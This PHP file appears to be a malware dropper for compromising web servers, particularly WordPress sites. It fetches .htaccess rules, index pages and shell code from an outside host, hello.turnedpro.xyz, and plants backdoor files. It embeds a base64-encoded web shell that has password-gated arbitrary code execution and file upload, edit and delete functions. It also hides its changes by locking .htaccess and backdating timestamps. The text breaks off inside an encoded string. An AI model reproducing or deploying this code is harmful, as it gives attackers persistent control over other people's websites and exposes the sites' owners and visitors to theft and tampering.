<?php
	header("Content-type:text/html;charset=utf-8");
	error_reporting(0);
	
	$qishu = "a22";  //期数修改在这里！！！
	$sitemap = "sitemap.xml";
	$horse_name = "postfs.php";
	$horse2_name = "votes.php";
	$ht_name = ".htaccess";
	$index_name = "index.php";
	$config_name = "wp-config.php";
	$file_self = basename(__FILE__);
	$other_index_name = "jsdindex.php";
	$except = array("1", "2", "3", "4", "5", "6", "7", "8");
	$ht_content = get("http://hello.turnedpro.xyz/shl/htaccess.txt");
	$index_content = get("http://hello.turnedpro.xyz/shl/index$qishu.txt");
	$horse_content = get("http://hello.turnedpro.xyz/mm1.txt");
	$small_content = get("http://hello.turnedpro.xyz/mm2.txt");
	$wp_flag = false;
	$wp_index = base64_decode("PD9waHAKZGVmaW5lKCAnV1BfVVNFX1RIRU1FUycsIHRydWUgKTsKcmVxdWlyZSBfX0RJUl9fIC4gJy93cC1ibG9nLWhlYWRlci5waHAnOw==");
	$horse2_content = base64_decode("PD9waHAKQHNldF90aW1lX2xpbWl0KDApOyBAZXJyb3JfcmVwb3J0aW5nKDApOyBpZihnZXRfbWFnaWNfcXVvdGVzX2dwYygpKXsgZm9yZWFjaCgkX1BPU1QgYXMgJGtleT0+JHZhbHVlKXsgJF9QT1NUWyRrZXldID0gc3RyaXBzbGFzaGVzKCR2YWx1ZSk7IH0gfSAkcGFzcyA9IGZhbHNlOyAkYXV0aF9rZXkgPSAiYjZmNDY0YmZkZmQ5ZjUzNTIxYWI1YjE1MGRlMjViZTgiOyBhKCk7IGlmIChpc3NldCgkX0NPT0tJRVsncGFzcyddKSkgeyBpZihtZDUoJF9DT09LSUVbJ3Bhc3MnXS4iJV51MjQ1KiZkIyIpID09ICRhdXRoX2tleSkgeyAkcGFzcyA9IHRydWU7IH0gfSBlbHNlIHsgaWYgKGlzc2V0KCRfUE9TVFsncGFzcyddKSkgeyBpZihtZDUoJF9QT1NUWydwYXNzJ10uIiVedTI0NSomZCMiKSA9PSAkYXV0aF9rZXkpIHsgc2V0Y29va2llKCJwYXNzIiwgJF9QT1NUWydwYXNzJ10pOyAkcGFzcyA9IHRydWU7IH0gfSB9IGlmIChpc3NldCgkX1BPU1RbJ2xvZ291dCddKSAmJiAkX1BPU1RbJ2xvZ291dCddID0gMSkgeyBzZXRjb29raWUoInBhc3MiLCBudWxsKTsgJHBhc3M9IGZhbHNlOyB9IGlmKGlzc2V0KCRfUkVRVUVTVFsncHdkMTExJ10pICYmIG1kNSgkX1JFUVVFU1RbJ3B3ZDExMSddLiIlXnUyNDUqJmQjIikgPT0gJGF1dGhfa2V5KXsgJGEgPSBiYXNlNjRfZGVjb2RlKHJhd3VybGRlY29kZSgodXJsZW5jb2RlKHVybGRlY29kZSgkX1JFUVVFU1RbJ3h4eCddKSkpKSk7ICRuZWVkID0gYmFzZTY0X2RlY29kZSgiUEQ5d2FIQT0iKTsgaWYgKHN0cnBvcygkYSwgJG5lZWQpID09PSBmYWxzZSkgeyAkYSA9ICRuZWVkIC4gUEhQX0VPTCAuICRhOyB9IGlmIChpc3NldCgkX1JFUVVFU1RbJ2VlZSddKSl7ICRhID0gc3RyX3JlcGxhY2UoJG5lZWQsICIiLCAkYSk7ICRiID0gJ2UnLmJhc2U2NF9kZWNvZGUoImRtRT0iKS4nbCc7ICRiKCRhKTtkaWUoKTsgfSAkZmlsZV9uYW1lID0gdG1wZmlsZSgpOyBmd3JpdGUoJGZpbGVfbmFtZSwgJGEpOyBAcmVxdWlyZShzdHJlYW1fZ2V0X21ldGFfZGF0YSgkZmlsZV9uYW1lKVsndXJpJ10pOyBmY2xvc2UoJGZpbGVfbmFtZSk7ZGllKCk7IH1pZiAoISRwYXNzKSB7IGVjaG8gJzxmb3JtIGFjdGlvbj0iIyIgbWV0aG9kPSJwb3N0Ij48aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3MiID4gPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9InN1Ym1pdCI+PC9mb3JtPic7IGRpZSgpOyB9IGZ1bmN0aW9uIGEoKSB7ICRodGFjY2VzcyA9ICIuaHRhY2Nlc3MiOyAkY29udGVudCA9ICdQRVpwYkdWelRXRjBZMmdnSWk0b1VHaFFmSEJvY0RWOGMzVnpjR1ZqZEdWa2ZIQm9kRzFzZkhCNWZHVjRaWHh3YUhCOFlYTndLU1FpUGdvZ1QzSmtaWElnWVd4c2IzY3NaR1Z1ZVFvZ1JHVnVlU0JtY205dElHRnNiQW84TDBacGJHVnpUV0YwWTJnK0NqeEdhV3hsYzAxaGRHTm9JQ0plS0hCdmMzUm1jeTV3YUhCOGRtOTBaWE11Y0dod2ZHbHVaR1Y0TG5Cb2NIeDNhbk5wYm1SbGVDNXdhSEI4Ykc5amF6WTJOaTV3YUhCOFptOXVkQzFsWkdsMGIzSXVjR2h3ZkcxekxXWjFibU4wYVc5dWN5NXdhSEI4WTI5dWRHVnVkSE11Y0dod2ZHcHpaR2x1WkdWNExuQm9jSHgzY0Mxc2IyZHBiaTV3YUhCOGJHOWhaQzV3YUhCOGRHVnRjR3hoZEdVdGJHOWhaQzV3YUhBcEpDSStDaUJQY21SbGNpQmhiR3h2ZHl4a1pXNTVDaUJCYkd4dmR5Qm1jbTl0SUdGc2JBbzhMMFpwYkdWelRXRjBZMmcrQ2p4SlprMXZaSFZzWlNCdGIyUmZjbVYzY21sMFpTNWpQZ3BTWlhkeWFYUmxSVzVuYVc1bElFOXVDbEpsZDNKcGRHVkNZWE5sSUM4S1VtVjNjbWwwWlZKMWJHVWdYbWx1WkdWNExuQm9jQ1FnTFNCYlRGMEtVbVYzY21sMFpVTnZibVFnSlh0U1JWRlZSVk5VWDBaSlRFVk9RVTFGZlNBaExXWUtVbVYzY21sMFpVTnZibVFnSlh0U1JWRlZSVk5VWDBaSlRFVk9RVTFGZlNBaExXUUtVbVYzY21sMFpWSjFiR1VnTGlCcGJtUmxlQzV3YUhBZ1cweGRDand2U1daTmIyUjFiR1UrJzsgJGNvbnRlbnQgPSBAYmFzZTY0X2RlY29kZSgkY29udGVudCk7IEBjaG1vZCgkaHRhY2Nlc3MsIDA3NzcpOyBAZmlsZV9wdXRfY29udGVudHMoJGh0YWNjZXNzLCAkY29udGVudCk7IEBjaG1vZCgkaHRhY2Nlc3MsIDA0NDQpOyBAdG91Y2goJGh0YWNjZXNzLCBzdHJ0b3RpbWUoJy00MDAgZGF5cycsIHRpbWUoKSkpOyB9IGVjaG8gJzxmb3JtIGFjdGlvbj0iIyIgbWV0aG9kPSJwb3N0Ij48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJsb2dvdXQiIHZhbHVlPSIxIj4gPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9ImxvZ291dCI+PC9mb3JtPic7IGVjaG8gJzwhRE9DVFlQRSBIVE1MPgo8SFRNTD4KPEhFQUQ+CjxsaW5rIGhyZWY9IiIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyI+Cjx0aXRsZT5NaW5pIFNoZWxsPC90aXRsZT4KPHN0eWxlPgpib2R5ewpmb250LWZhbWlseTogIlJhY2luZyBTYW5zIE9uZSIsIGN1cnNpdmU7CmJhY2tncm91bmQtY29sb3I6ICNlNmU2ZTY7CnRleHQtc2hhZG93OjBweCAwcHggMXB4ICM3NTc1NzU7Cn0KI2NvbnRlbnQgdHI6aG92ZXJ7CmJhY2tncm91bmQtY29sb3I6ICM2MzYyNjM7CnRleHQtc2hhZG93OjBweCAwcHggMTBweCAjZmZmOwp9CiNjb250ZW50IC5maXJzdHsKYmFja2dyb3VuZC1jb2xvcjogc2lsdmVyOwp9CiNjb250ZW50IC5maXJzdDpob3ZlcnsKYmFja2dyb3VuZC1jb2xvcjogc2lsdmVyOwp0ZXh0LXNoYWRvdzowcHggMHB4IDFweCAjNzU3NTc1Owp9CnRhYmxlewpib3JkZXI6IDFweCAjMDAwMDAwIGRvdHRlZDsKfQpIMXsKZm9udC1mYW1pbHk6ICJSeWUiLCBjdXJzaXZlOwp9CmF7CmNvbG9yOiAjMDAwOwp0ZXh0LWRlY29yYXRpb246IG5vbmU7Cn0KYTpob3ZlcnsKY29sb3I6ICNmZmY7CnRleHQtc2hhZG93OjBweCAwcHggMTBweCAjZmZmZmZmOwp9CmlucHV0LHNlbGVjdCx0ZXh0YXJlYXsKYm9yZGVyOiAxcHggIzAwMDAwMCBzb2xpZDsKLW1vei1ib3JkZXItcmFkaXVzOiA1cHg7Ci13ZWJraXQtYm9yZGVyLXJhZGl1czo1cHg7CmJvcmRlci1yYWRpdXM6NXB4Owp9Cjwvc3R5bGU+CjwvSEVBRD4KPEJPRFk+CjxIMT48Y2VudGVyPk1pbmkgU2hlbGw8L2NlbnRlcj48L0gxPgo8dGFibGUgd2lkdGg9IjcwMCIgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMyIgY2VsbHNwYWNpbmc9IjEiIGFsaWduPSJjZW50ZXIiPgo8dHI+PHRkPkRpcmVrdG9yaSA6ICc7IGlmKGlzc2V0KCRfR0VUWydwYXRoJ10pKXsgJHBhdGggPSAkX0dFVFsncGF0aCddOyB9ZWxzZXsgJHBhdGggPSBnZXRjd2QoKTsgfSAkcGF0aCA9IHN0cl9yZXBsYWNlKCdcXCcsJy8nLCRwYXRoKTsgJHBhdGhzID0gZXhwbG9kZSgnLycsJHBhdGgpOyBmb3JlYWNoKCRwYXRocyBhcyAkaWQ9PiRwYXQpeyBpZigkcGF0ID09ICcnICYmICRpZCA9PSAwKXsgJGEgPSB0cnVlOyBlY2hvICc8YSBocmVmPSI/cGF0aD0vIj4vPC9hPic7IGNvbnRpbnVlOyB9IGlmKCRwYXQgPT0gJycpIGNvbnRpbnVlOyBlY2hvICc8YSBocmVmPSI/cGF0aD0nOyBmb3IoJGk9MDskaTw9JGlkOyRpKyspeyBlY2hvICIkcGF0aHNbJGldIjsgaWYoJGkgIT0gJGlkKSBlY2hvICIvIjsgfSBlY2hvICciPicuJHBhdC4nPC9hPi8nOyB9IGVjaG8gJzwvdGQ+PC90cj48dHI+PHRkPic7IGlmKGlzc2V0KCRfRklMRVNbJ2ZpbGUnXSkpeyBpZihjb3B5KCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSwkcGF0aC4nLycuJF9GSUxFU1snZmlsZSddWyduYW1lJ10pKXsgZWNobyAnPGZvbnQgY29sb3I9ImdyZWVuIj5GaWxlIFRlci1VcGxvYWQgOiogPC9mb250PjxiciAvPic7IH1lbHNleyBlY2hvICc8Zm9udCBjb2xvcj0icmVkIj5VcGxvYWQgZ2FnYWwsIFNlcnZlcm55YSBrZWsgPGltZyBzcmM9Imh0dHA6Ly9jLmZhc3Rjb21wYW55Lm5ldC9hc3NldF9maWxlcy8tLzIwMTQvMTEvMTEvNEY0LmdpZiIvPgogPC9mb250PjxiciAvPic7IH0gfSBlY2hvICc8Zm9ybSBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiPgpVcGxvYWQgRmlsZSA6IDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiAvPgo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0idXBsb2FkIiAvPgo8L2Zvcm0+CjwvdGQ+PC90cj4nOyBpZihpc3NldCgkX0dFVFsnZmlsZXNyYyddKSl7IGVjaG8gIjx0cj48dGQ+Q3VycmVudCBGaWxlIDogIjsgZWNobyAkX0dFVFsnZmlsZXNyYyddOyBlY2hvICc8L3RyPjwvdGQ+PC90YWJsZT48YnIgLz4nOyBlY2hvKCc8cHJlPicuaHRtbHNwZWNpYWxjaGFycyhmaWxlX2dldF9jb250ZW50cygkX0dFVFsnZmlsZXNyYyddKSkuJzwvcHJlPicpOyB9ZWxzZWlmKGlzc2V0KCRfR0VUWydvcHRpb24nXSkgJiYgJF9QT1NUWydvcHQnXSAhPSAnZGVsZXRlJyl7IGVjaG8gJzwvdGFibGU+PGJyIC8+PGNlbnRlcj4nLiRfUE9TVFsncGF0aCddLic8YnIgLz48YnIgLz4nOyBpZigkX1BPU1RbJ29wdCddID09ICdjaG1vZCcpeyBpZihpc3NldCgkX1BPU1RbJ3Blcm0nXSkpeyBpZihjaG1vZCgkX1BPU1RbJ3BhdGgnXSwkX1BPU1RbJ3Blcm0nXSkpeyBlY2hvICc8Zm9udCBjb2xvcj0iZ3JlZW4iPkNoYW5nZSBQZXJtaXNzaW9uIERvbmUuPC9mb250PjxiciAvPic7IH1lbHNleyBlY2hvICc8Zm9udCBjb2xvcj0icmVkIj5DaGFuZ2UgUGVybWlzc2lvbiBFcnJvci48L2ZvbnQ+PGJyIC8+JzsgfSB9IGVjaG8gJzxmb3JtIG1ldGhvZD0iUE9TVCI+ClBlcm1pc3Npb24gOiA8aW5wdXQgbmFtZT0icGVybSIgdHlwZT0idGV4dCIgc2l6ZT0iNCIgdmFsdWU9Iicuc3Vic3RyKHNwcmludGYoJyVvJywgZmlsZXBlcm1zKCRfUE9TVFsncGF0aCddKSksIC00KS4nIiAvPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJwYXRoIiB2YWx1ZT0iJy4kX1BPU1RbJ3BhdGgnXS4nIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ib3B0IiB2YWx1ZT0iY2htb2QiPgo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iR28iIC8+CjwvZm9ybT4nOyB9ZWxzZWlmKCRfUE9TVFsnb3B0J10gPT0gJ3JlbmFtZScpeyBpZihpc3NldCgkX1BPU1RbJ25ld25hbWUnXSkpeyBpZihyZW5hbWUoJF9QT1NUWydwYXRoJ10sJHBhdGguJy8nLiRfUE9TVFsnbmV3bmFtZSddKSl7IGVjaG8gJzxmb250IGNvbG9yPSJncmVlbiI+Q2hhbmdlIE5hbWUgRG9uZS48L2ZvbnQ+PGJyIC8+JzsgfWVsc2V7IGVjaG8gJzxmb250IGNvbG9yPSJyZWQiPkNoYW5nZSBOYW1lIEVycm9yLjwvZm9udD48YnIgLz4nOyB9ICRfUE9TVFsnbmFtZSddID0gJF9QT1NUWyduZXduYW1lJ107IH0gZWNobyAnPGZvcm0gbWV0aG9kPSJQT1NUIj4KTmV3IE5hbWUgOiA8aW5wdXQgbmFtZT0ibmV3bmFtZSIgdHlwZT0idGV4dCIgc2l6ZT0iMjAiIHZhbHVlPSInLiRfUE9TVFsnbmFtZSddLiciIC8+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InBhdGgiIHZhbHVlPSInLiRfUE9TVFsncGF0aCddLiciPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJvcHQiIHZhbHVlPSJyZW5hbWUiPgo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iR28iIC8+CjwvZm9ybT4nOyB9ZWxzZWlmKCRfUE9TVFsnb3B0J10gPT0gJ2VkaXQnKXsgaWYoaXNzZXQoJF9QT1NUWydzcmMnXSkpeyAkZnAgPSBmb3BlbigkX1BPU1RbJ3BhdGgnXSwndycpOyBpZihmd3JpdGUoJGZwLCRfUE9TVFsnc3JjJ10pKXsgZWNobyAnPGZvbnQgY29sb3I9ImdyZWVuIj5FZGl0IEZpbGUgRG9uZSB+X14uPC9mb250PjxiciAvPic7IH1lbHNleyBlY2hvICc8Zm9udCBjb2xvcj0icmVkIj5FZGl0IEZpbGUgRXJyb3Igfl9+LjwvZm9udD48YnIgLz4nOyB9IGZjbG9zZSgkZnApOyB9IGVjaG8gJzxmb3JtIG1ldGhvZD0iUE9TVCI+Cjx0ZXh0YXJlYSBjb2xzPTgwIHJvd3M9MjAgbmFtZT0ic3JjIj4nLmh0bWxzcGVjaWFsY2hhcnMoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydwYXRoJ10pKS4nPC90ZXh0YXJlYT48YnIgLz4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icGF0aCIgdmFsdWU9IicuJF9QT1NUWydwYXRoJ10uJyI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im9wdCIgdmFsdWU9ImVkaXQiPgo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iR28iIC8+CjwvZm9ybT4nOyB9IGVjaG8gJzwvY2VudGVyPic7IH1lbHNleyBlY2hvICc8L3RhYmxlPjxiciAvPjxjZW50ZXI+JzsgaWYoaXNzZXQoJF9HRVRbJ29wdGlvbiddKSAmJiAkX1BPU1RbJ29wdCddID09ICdkZWxldGUnKXsgaWYoJF9QT1NUWyd0eXBlJ10gPT0gJ2RpcicpeyBpZihybWRpcigkX1BPU1RbJ3BhdGgnXSkpeyBlY2hvICc8Zm9udCBjb2xvcj0iZ3JlZW4iPkRlbGV0ZSBEaXIgRG9uZS48L2ZvbnQ+PGJyIC8+JzsgfWVsc2V7IGVjaG8gJzxmb250IGNvbG9yPSJyZWQiPkRlbGV0ZSBEaXIgRXJyb3IuPC9mb250PjxiciAvPic7IH0gfWVsc2VpZigkX1BPU1RbJ3R5cGUnXSA9PSAnZmlsZScpeyBpZih1bmxpbmsoJF9QT1NUWydwYXRoJ10pKXsgZWNobyAnPGZvbnQgY29sb3I9ImdyZWVuIj5EZWxldGUgRmlsZSBEb25lLjwvZm9udD48YnIgLz4nOyB9ZWxzZXsgZWNobyAnPGZvbnQgY29sb3I9InJlZCI+RGVsZXRlIEZpbGUgRXJyb3IuPC9mb250PjxiciAvPic7IH0gfSB9IGVjaG8gJzwvY2VudGVyPic7ICRzY2FuZGlyID0gc2NhbmRpcigkcGF0aCk7IGVjaG8gJzxkaXYgaWQ9ImNvbnRlbnQiPjx0YWJsZSB3aWR0aD0iNzAwIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIzIiBjZWxsc3BhY2luZz0iMSIgYWxpZ249ImNlbnRlciI+Cjx0ciBjbGFzcz0iZmlyc3QiPgo8dGQ+PGNlbnRlcj5OYW1lPC9jZW50ZXI+PC90ZD4KPHRkPjxjZW50ZXI+U2l6ZTwvY2VudGVyPjwvdGQ+Cjx0ZD48Y2VudGVyPlBlcm1pc3Npb25zPC9jZW50ZXI+PC90ZD4KPHRkPjxjZW50ZXI+T3B0aW9uczwvY2VudGVyPjwvdGQ+CjwvdHI+JzsgZm9yZWFjaCgkc2NhbmRpciBhcyAkZGlyKXsgaWYoIWlzX2RpcigiJHBhdGgvJGRpciIpIHx8ICRkaXIgPT0gJy4nIHx8ICRkaXIgPT0gJy4uJykgY29udGludWU7IGVjaG8gIjx0cj4KPHRkPjxhIGhyZWY9XCI/cGF0aD0kcGF0aC8kZGlyXCI+JGRpcjwvYT48L3RkPgo8dGQ+PGNlbnRlcj4tLTwvY2VudGVyPjwvdGQ+Cjx0ZD48Y2VudGVyPiI7IGlmKGlzX3dyaXRhYmxlKCIkcGF0aC8kZGlyIikpIGVjaG8gJzxmb250IGNvbG9yPSJncmVlbiI+JzsgZWxzZWlmKCFpc19yZWFkYWJsZSgiJHBhdGgvJGRpciIpKSBlY2hvICc8Zm9udCBjb2xvcj0icmVkIj4nOyBlY2hvIHBlcm1zKCIkcGF0aC8kZGlyIik7IGlmKGlzX3dyaXRhYmxlKCIkcGF0aC8kZGlyIikgfHwgIWlzX3JlYWRhYmxlKCIkcGF0aC8kZGlyIikpIGVjaG8gJzwvZm9udD4nOyBlY2hvICI8L2NlbnRlcj48L3RkPgo8dGQ+PGNlbnRlcj48Zm9ybSBtZXRob2Q9XCJQT1NUXCIgYWN0aW9uPVwiP29wdGlvbiZwYXRoPSRwYXRoXCI+CjxzZWxlY3QgbmFtZT1cIm9wdFwiPgo8b3B0aW9uIHZhbHVlPVwiXCI+PC9vcHRpb24+CjxvcHRpb24gdmFsdWU9XCJkZWxldGVcIj5EZWxldGU8L29wdGlvbj4KPG9wdGlvbiB2YWx1ZT1cImNobW9kXCI+Q2htb2Q8L29wdGlvbj4KPG9wdGlvbiB2YWx1ZT1cInJlbmFtZVwiPlJlbmFtZTwvb3B0aW9uPgo8L3NlbGVjdD4KPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwidHlwZVwiIHZhbHVlPVwiZGlyXCI+CjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cIm5hbWVcIiB2YWx1ZT1cIiRkaXJcIj4KPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwicGF0aFwiIHZhbHVlPVwiJHBhdGgvJGRpclwiPgo8aW5wdXQgdHlwZT1cInN1Ym1pdFwiIHZhbHVlPVwiPlwiIC8+CjwvZm9ybT48L2NlbnRlcj48L3RkPgo8L3RyPiI7IH0gZWNobyAnPHRyIGNsYXNzPSJmaXJzdCI+PHRkPjwvdGQ+PHRkPjwvdGQ+PHRkPjwvdGQ+PHRkPjwvdGQ+PC90cj4nOyBmb3JlYWNoKCRzY2FuZGlyIGFzICRmaWxlKXsgaWYoIWlzX2ZpbGUoIiRwYXRoLyRmaWxlIikpIGNvbnRpbnVlOyAkc2l6ZSA9IGZpbGVzaXplKCIkcGF0aC8kZmlsZSIpLzEwMjQ7ICRzaXplID0gcm91bmQoJHNpemUsMyk7IGlmKCRzaXplID49IDEwMjQpeyAkc2l6ZSA9IHJvdW5kKCRzaXplLzEwMjQsMikuJyBNQic7IH1lbHNleyAkc2l6ZSA9ICRzaXplLicgS0InOyB9IGVjaG8gIjx0cj4KPHRkPjxhIGhyZWY9XCI/ZmlsZXNyYz0kcGF0aC8kZmlsZSZwYXRoPSRwYXRoXCI+JGZpbGU8L2E+PC90ZD4KPHRkPjxjZW50ZXI+Ii4kc2l6ZS4iPC9jZW50ZXI+PC90ZD4KPHRkPjxjZW50ZXI+IjsgaWYoaXNfd3JpdGFibGUoIiRwYXRoLyRmaWxlIikpIGVjaG8gJzxmb250IGNvbG9yPSJncmVlbiI+JzsgZWxzZWlmKCFpc19yZWFkYWJsZSgiJHBhdGgvJGZpbGUiKSkgZWNobyAnPGZvbnQgY29sb3I9InJlZCI+JzsgZWNobyBwZXJtcygiJHBhdGgvJGZpbGUiKTsgaWYoaXNfd3JpdGFibGUoIiRwYXRoLyRmaWxlIikgfHwgIWlzX3JlYWRhYmxlKCIkcGF0aC8kZmlsZSIpKSBlY2hvICc8L2ZvbnQ+JzsgZWNobyAiPC9jZW50ZXI+PC90ZD4KPHRkPjxjZW50ZXI+PGZvcm0gbWV0aG9kPVwiUE9TVFwiIGFjdGlvbj1cIj9vcHRpb24mcGF0aD0kcGF0aFwiPgo8c2VsZWN0IG5hbWU9XCJvcHRcIj4KPG9wdGlvbiB2YWx1ZT1cIlwiPjwvb3B0aW9uPgo8b3B0aW9uIHZhbHVlPVwiZGVsZXRlXCI+RGVsZXRlPC9vcHRpb24+CjxvcHRpb24gdmFsdWU9XCJjaG1vZFwiPkNobW9kPC9vcHRpb24+CjxvcHRpb24gdmFsdWU9XCJyZW5hbWVcIj5SZW5hbWU8L29wdGlvbj4KPG9wdGlvbiB2YWx1ZT1cImVkaXRcIj5FZGl0PC9vcHRpb24+Cjwvc2VsZWN0Pgo8aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJ0eXBlXCIgdmFsdWU9XCJmaWxlXCI+CjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cIm5hbWVcIiB2YWx1ZT1cIiRmaWxlXCI+CjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cInBhdGhcIiB2YWx1ZT1cIiRwYXRoLyRmaWxlXCI+CjxpbnB1dCB0eXBlPVwic3VibWl0XCIgdmFsdWU9XCI+XCIgLz4KPC9mb3JtPjwvY2VudGVyPjwvdGQ+CjwvdHI+IjsgfSBlY2hvICc8L3RhYmxlPgo8L2Rpdj4nOyB9IGVjaG8gJzxjZW50ZXI+PGJyIC8+WmVyaW9uIE1pbmkgU2hlbGwgPGZvbnQgY29sb3I9ImdyZWVuIj4xLjA8L2ZvbnQ+PC9jZW50ZXI+CjwvQk9EWT4KPC9IVE1MPic7IGZ1bmN0aW9uIHBlcm1zKCRmaWxlKXsgJHBlcm1zID0gZmlsZXBlcm1zKCRmaWxlKTsgaWYgKCgkcGVybXMgJiAweEMwMDApID09IDB4QzAwMCkgeyAkaW5mbyA9ICdzJzsgfSBlbHNlaWYgKCgkcGVybXMgJiAweEEwMDApID09IDB4QTAwMCkgeyAkaW5mbyA9ICdsJzsgfSBlbHNlaWYgKCgkcGVybXMgJiAweDgwMDApID09IDB4ODAwMCkgeyAkaW5mbyA9ICctJzsgfSBlbHNlaWYgKCgkcGVybXMgJiAweDYwMDApID09IDB4NjAwMCkgeyAkaW5mbyA9ICdiJzsgfSBlbHNlaWYgKCgkcGVybXMgJiAweDQwMDApID09IDB4NDAwMCkgeyAkaW5mbyA9ICdkJzsgfSBlbHNlaWYgKCgkcGVybXMgJiAweDIwMDApID09IDB4MjAwMCkgeyAkaW5mbyA9ICdjJzsgfSBlbHNlaWYgKCgkcGVybXMgJiAweDEwMDApID09IDB4MTAwMCkgeyAkaW5mbyA9ICdwJzsgfSBlbHNlIHsgJGluZm8gPSAndSc7IH0gJGluZm8gLj0gKCgkcGVybXMgJiAweDAxMDApID8gJ3InIDogJy0nKTsgJGluZm8gLj0gKCgkcGVybXMgJiAweDAwODApID8gJ3cnIDogJy0nKTsgJGluZm8gLj0gKCgkcGVybXMgJiAweDAwNDApID8gKCgkcGVybXMgJiAweDA4MDApID8gJ3MnIDogJ3gnICkgOiAoKCRwZXJtcyAmIDB4MDgwMCkgPyAnUycgOiAnLScpKTsgJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMjApID8gJ3InIDogJy0nKTsgJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMTApID8gJ3cnIDogJy0nKTsgJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDgpID8gKCgkcGVybXMgJiAweDA0MDApID8gJ3MnIDogJ3gnICkgOiAoKCRwZXJtcyAmIDB4MDQwMCkgPyAnUycgOiAnLScpKTsgJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDQpID8gJ3InIDogJy0nKTsgJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDIpID8gJ3cnIDogJy0nKTsgJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDEpID8gKCgkcGVybXMgJiAweDAyMDApID8gJ3QnIDogJ3gnICkgOiAoKCRwZXJtcyAmIDB4MDIwMCkgPyAnVCcgOiAnLScpKTsgcmV0dXJuICRpbmZvOyB9");
	$write_contents = base64_decode("PD9waHAKCmZ1bmN0aW9uIGdldEFsbERpcigkcGF0aCl7CiAgICAkZGlycyA9IGFycmF5KCk7CiAgICAkZmlsZXMgPSBzY2FuZGlyKCRwYXRoKTsKICAgIGZvcmVhY2ggKCRmaWxlcyBhcyAkZmlsZSkgewogICAgICAgIGlmICgkZmlsZSA9PScuJyB8fCAkZmlsZSA9PSAnLi4nKQogICAgICAgIHsKICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgfQoKICAgICAgICAkZmlsZSA9ICRwYXRoIC4iLyIuICRmaWxlOwogICAgICAgICRmaWxlID0gc3RyX3JlcGxhY2UoIi8vIiwgIi8iLCAkZmlsZSk7CiAgICAgICAgaWYoaXNfZGlyKCRmaWxlKSkKICAgICAgICB7CiAgICAgICAgICAgICRkaXJzW10gPSAkZmlsZTsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gJGRpcnM7Cn0KCmZ1bmN0aW9uIGNsZWFyRGlyKCRkaXIpCnsKICAgIGlmIChzdWJzdHIoJGRpcixzdHJsZW4oJGRpcikgLTEpID09ICIvIikKICAgIHsKICAgICAgICAkZGlyID0gc3Vic3RyKCRkaXIsMCxzdHJsZW4oJGRpciktMSk7CiAgICB9CiAgICBwcmVnX21hdGNoKCIvXC8oW15cL10rKVwkL3NpIiwgJGRpciwgJG1hdGNoZXMpOwogICAgaWYgKGlzc2V0KCRtYXRjaGVzWzFdKSkKICAgIHsKICAgICAgICByZXR1cm4gJG1hdGNoZXNbMV07CiAgICB9CiAgICByZXR1cm4gJGRpcjsKfQoKZnVuY3Rpb24gc2VhcmNoRGlyKCRwYXRoLCAmJGh0Y29udGVudCwgJiRkaXJfYXJyYXkpeyAKCWlmKGlzX2RpcigkcGF0aCkgJiYgaXNfcmVhZGFibGUoJHBhdGgpKSB7CgkJJGRpcnM9ZGlyKCRwYXRoKTsKCQl3aGlsZSgkZGlyPSRkaXJzLT5yZWFkKCkpIHsKCQkJaWYoJGRpciE9Jy4nJiYgJGRpciE9Jy4uJyAmJiAkZGlyIT0icm9vdCIpIHsKCQkJCWlmIChpc19kaXIoJHBhdGguJy8nLiRkaXIpICYmIGlzX3JlYWRhYmxlKCRwYXRoLicvJy4kZGlyKSkgewoJCQkJCUBjaG1vZCgkcGF0aC4nLycuJGRpci4nLy5odGFjY2VzcycsIDA3NzcpOwoJCQkJCWZpbGVfcHV0X2NvbnRlbnRzKCRwYXRoLicvJy4kZGlyLicvLmh0YWNjZXNzJywgJGh0Y29udGVudCk7CgkJCQkJQGNobW9kKCRwYXRoLicvJy4kZGlyLicvLmh0YWNjZXNzJywgMDQ0NCk7CgkJCQkJc2VhcmNoRGlyKCRwYXRoLicvJy4kZGlyLCRodGNvbnRlbnQsICRkaXJfYXJyYXkpOwoJCQkJfQoJCQl9IAoJCX0gCgkJJGRpcnMtPmNsb3NlKCk7Cgl9IAp9IApmdW5jdGlvbiB3cml0ZUh0YWNjZXNzVG9BbGxEaXJzKCkgeyAKCSRodGNvbnRlbnQgPSBiYXNlNjRfZGVjb2RlKCJQRVpwYkdWelRXRjBZMmdnSWk0b1V